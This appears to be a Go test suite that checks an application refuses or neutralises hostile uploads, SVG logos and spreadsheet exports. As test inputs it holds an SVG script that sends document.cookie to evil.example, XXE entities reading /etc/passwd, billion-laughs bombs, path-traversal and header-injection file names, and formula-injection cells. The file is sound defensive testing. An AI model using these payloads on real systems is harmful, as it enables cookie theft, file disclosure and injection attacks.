package hostile_test

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"io"
	"mime"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/cognizhi/fyniq/internal/domain/brand"
	"github.com/cognizhi/fyniq/internal/domain/evidence"
	"github.com/cognizhi/fyniq/internal/ports"
	"github.com/cognizhi/fyniq/internal/sheet"
)

// marked is the malware scanner of the suite: it flags a file carrying the marker, and passes anything else.
type marked struct{}

const marker = "HOSTILE-SUITE-MALWARE-MARKER"

func (marked) Scan(_ context.Context, r io.Reader) (ports.ScanResult, error) {
	b, err := io.ReadAll(r)
	if err != nil {
		return ports.ScanResult{}, err
	}
	if bytes.Contains(b, []byte(marker)) {
		return ports.ScanResult{Signature: "Hostile-Suite-Marker"}, nil
	}
	return ports.ScanResult{Clean: true}, nil
}

// office is a ZIP with the parts given, each deflated.
func office(t *testing.T, parts map[string]string) []byte {
	t.Helper()
	var b bytes.Buffer
	w := zip.NewWriter(&b)
	for name, body := range parts {
		f, err := w.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = f.Write([]byte(body))
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// jpegWithGPS is a JPEG whose EXIF segment says where it was taken.
func jpegWithGPS() []byte {
	seg := func(m byte, body string) []byte {
		b := []byte{0xff, m, 0, 0}
		binary.BigEndian.PutUint16(b[2:], uint16(len(body)+2)) // #nosec G115 -- a short test body
		return append(b, body...)
	}
	b := []byte{0xff, 0xd8}
	b = append(b, seg(0xe0, "JFIF\x00\x01\x02")...)
	b = append(b, seg(0xe1, "Exif\x00\x00GPS 1.3521N 103.8198E")...)
	b = append(b, seg(0xda, "\x00\x01")...)
	b = append(b, "picture-data"...)
	return append(b, 0xff, 0xd9)
}

func codeOf(problems []evidence.Problem) string {
	if len(problems) == 0 {
		return ""
	}
	return problems[0].Code
}

// QA-SEC-05: hostile files are refused before anything is stored, or neutralised, and never read for more than they
// may hold (FR-DOC-08). A macro-enabled workbook, a ZIP bomb named as an XLSX, a renamed Windows or Linux executable, an
// HTML page named as a PDF, an oversized file and a flagged one are each refused with their code. A PDF that is also
// HTML is typed by its content, a PDF, and served as one. A photo keeps no location. A DOCX whose part declares an
// external entity, and one holding a billion-laughs bomb, are kept as files and never parsed as XML: the entity's
// address is never fetched. A hostile file name keeps no path or control character, and its download header carries
// it encoded, never a header of its own.
// req: QA-SEC-05
// req: FR-DOC-08
// asvs: V5.2.1, V5.2.2, V5.2.3, V1.5.1, V5.4.1
func TestHostileFilesAreRefusedOrNeutralised(t *testing.T) {
	ctx := context.Background()
	var fetched atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fetched.Add(1)
		_, _ = w.Write([]byte("secret"))
	}))
	defer srv.Close()
	docx := func(document string) []byte {
		return office(t, map[string]string{"[Content_Types].xml": `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`,
			"word/document.xml": document})
	}

	for _, c := range []struct {
		name, file string
		data       []byte
		code       string
	}{
		{"a macro-enabled workbook", "budget.xlsx", office(t, map[string]string{"xl/workbook.xml": "<workbook/>", "xl/vbaProject.bin": "VBA"}), evidence.CodeMacro},
		{"a ZIP bomb named as an XLSX", "report.xlsx", office(t, map[string]string{"xl/workbook.xml": strings.Repeat("0", 8<<20)}), evidence.CodeArchive},
		{"a renamed Windows executable", "invoice.pdf", []byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00"), evidence.CodeType},
		{"a renamed Linux executable", "receipt.jpg", []byte("\x7fELF\x02\x01\x01\x00"), evidence.CodeType},
		{"an HTML page named as a PDF", "statement.pdf", []byte("<html><script>fetch('/api/v1/session')</script></html>"), evidence.CodeType},
		{"an oversized file", "scan.pdf", append([]byte("%PDF-1.7 "), make([]byte, evidence.MaxBytes)...), evidence.CodeSize},
		{"a file the scanner flags", "receipt.pdf", []byte("%PDF-1.7 " + marker), evidence.CodeMalware},
	} {
		f, problems, err := evidence.Check(ctx, marked{}, c.file, c.data)
		if err != nil || codeOf(problems) != c.code || f.Data != nil {
			t.Errorf("%s: %v %v, %d bytes kept; want %s and nothing kept", c.name, problems, err, len(f.Data), c.code)
		}
	}

	// A polyglot is what its content starts as: a PDF, never HTML, and the download is an attachment of that type.
	poly := []byte("%PDF-1.7\n<html><script>alert(1)</script></html>")
	if f, problems, err := evidence.Check(ctx, marked{}, "both.html", poly); err != nil || len(problems) > 0 || f.MediaType != evidence.PDF {
		t.Errorf("a PDF that is also HTML: %s %v %v", f.MediaType, problems, err)
	}

	// A photo's location is stripped before it is stored; the hash of the file as received is kept beside it.
	if f, problems, err := evidence.Check(ctx, marked{}, "receipt.jpg", jpegWithGPS()); err != nil || len(problems) > 0 ||
		bytes.Contains(f.Data, []byte("GPS")) || f.SHA256 == f.OriginalSHA256 {
		t.Errorf("a photo with its location: %v %v, GPS kept %v", problems, err, bytes.Contains(f.Data, []byte("GPS")))
	}

	// XML in a DOCX is never parsed: an external entity is never fetched, and a bomb never expands.
	for name, document := range map[string]string{
		"an external entity": `<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY x SYSTEM "` + srv.URL + `/xxe">]>` +
			`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>`,
		"a billion laughs": `<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">` +
			`<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><w:document><w:body>&d;</w:body></w:document>`,
	} {
		data := docx(document)
		f, problems, err := evidence.Check(ctx, marked{}, "letter.docx", data)
		if err != nil || len(problems) > 0 || f.MediaType != evidence.DOCX || !bytes.Equal(f.Data, data) {
			t.Errorf("a DOCX with %s: %s %v %v; want it kept as received", name, f.MediaType, problems, err)
		}
		if n := evidence.UnmaskedNRIC(evidence.DOCX, data); n {
			t.Errorf("a DOCX with %s: its text read as an NRIC", name)
		}
	}
	if fetched.Load() != 0 {
		t.Errorf("the external entity's address was fetched %d times", fetched.Load())
	}

	// A hostile name keeps no path or control character; its download header holds it as one encoded parameter.
	for in, want := range map[string]string{
		"../../etc/passwd":                "passwd",
		`C:\Windows\win.ini`:              "win.ini",
		"inv\r\nSet-Cookie: s=1.pdf":      "inv__Set-Cookie: s=1.pdf",
		"evil.pdf\x00.exe":                "evil.pdf_.exe",
		"..":                              "file",
		strings.Repeat("a", 300) + ".pdf": strings.Repeat("a", 255),
	} {
		got := evidence.SafeName(in)
		if got != want {
			t.Errorf("SafeName(%q) = %q, want %q", in, got, want)
		}
		header := mime.FormatMediaType("attachment", map[string]string{"filename": got})
		if header == "" || strings.ContainsAny(header, "\r\n\x00") {
			t.Errorf("the download header of %q: %q", got, header)
		}
		if _, params, err := mime.ParseMediaType(header); err != nil || params["filename"] != got {
			t.Errorf("the download header of %q reads back as %v (%v)", got, params, err)
		}
	}
}

// QA-SEC-05: a logo is an SVG made safe, or a PNG written again; nothing in it runs or reaches out (FR-ORG-09). A
// script, an event handler and a foreign object are taken out, and so are references to other places: an image by URL,
// a use of another file and a stylesheet import. An SVG declaring an entity, external or a billion laughs, is refused
// before anything in it is read.
// req: QA-SEC-05
// req: FR-ORG-09
// asvs: V5.2.2, V1.5.1, V3.2.2
func TestHostileLogosAreMadeSafe(t *testing.T) {
	hostile := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 40 10" onload="steal()">` +
		`<script>fetch('https://evil.example/?c='+document.cookie)</script>` +
		`<style>@import url("https://evil.example/x.css");</style>` +
		`<foreignObject width="10" height="10"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/"/></foreignObject>` +
		`<image href="https://evil.example/pixel.png" width="1" height="1"/>` +
		`<use xlink:href="https://evil.example/sprite.svg#a"/>` +
		`<a href="javascript:alert(1)"><rect width="40" height="10" fill="#0F766E" onclick="steal()"/></a></svg>`
	clean, err := brand.Check(brand.Light, []byte(hostile))
	if err != nil {
		t.Fatalf("the hostile logo: %v", err)
	}
	out := strings.ToLower(string(clean.Data))
	for _, gone := range []string{"<script", "onload", "onclick", "@import", "foreignobject", "iframe", "evil.example", "javascript:"} {
		if strings.Contains(out, gone) {
			t.Errorf("the cleaned logo still holds %q: %s", gone, clean.Data)
		}
	}
	if !strings.Contains(out, "<rect") || !clean.Removed.Any() || clean.Removed.External == 0 {
		t.Errorf("the cleaned logo lost its shape, or says nothing was removed: %+v %s", clean.Removed, clean.Data)
	}
	for name, svg := range map[string]string{
		"an external entity": `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>`,
		"a billion laughs":   `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;">]><svg xmlns="http://www.w3.org/2000/svg">&b;</svg>`,
	} {
		var e *brand.Error
		if _, err := brand.Check(brand.Light, []byte(svg)); !errors.As(err, &e) {
			t.Errorf("a logo with %s: %v; want it refused", name, err)
		}
	}
}

// QA-SEC-05: an export never runs what a person typed (FR-RPT-05). A contact named as a formula and a note of +1-2
// are text a spreadsheet will not evaluate, in CSV and in XLSX, and a negative amount is a number with an ASCII minus.
// req: QA-SEC-05
// req: FR-RPT-05
// asvs: V1.2.10
func TestHostileExportsAreInert(t *testing.T) {
	s := sheet.Sheet{Name: "Contacts", Header: []string{"Name", "Note", "Balance"}, Rows: []sheet.Row{
		{Cells: []sheet.Cell{sheet.Text(`=HYPERLINK("https://evil.example","Pay here")`), sheet.Text("+1-2"), sheet.Number("-1234.56", 2)}},
		{Cells: []sheet.Cell{sheet.Text("@SUM(A1:A9)"), sheet.Text("-2+3"), sheet.Number("0.00", 2)}},
	}}
	csv := string(sheet.CSV(s))
	for _, want := range []string{`"'=HYPERLINK(""https://evil.example"",""Pay here"")"`, `"'+1-2"`, ",-1234.56", `"'@SUM(A1:A9)"`, `"'-2+3"`} {
		if !strings.Contains(csv, want) {
			t.Errorf("the CSV lacks %s:\n%s", want, csv)
		}
	}
	x, err := sheet.XLSX([]sheet.Sheet{s}, time.Date(2026, 10, 31, 0, 0, 0, 0, time.UTC))
	if err != nil {
		t.Fatal(err)
	}
	z, err := zip.NewReader(bytes.NewReader(x), int64(len(x)))
	if err != nil {
		t.Fatal(err)
	}
	var cells string
	for _, f := range z.File {
		if f.Name == "xl/worksheets/sheet1.xml" {
			rc, _ := f.Open()
			b, _ := io.ReadAll(rc)
			_ = rc.Close()
			cells = string(b)
		}
	}
	if strings.Contains(cells, "<f>") || !strings.Contains(cells, `t="inlineStr"><is><t xml:space="preserve">=HYPERLINK(`) ||
		!strings.Contains(cells, "<v>-1234.56</v>") {
		t.Errorf("the XLSX sheet: a formula, or the name not inline text, or the amount not a number:\n%s", cells)
	}
}
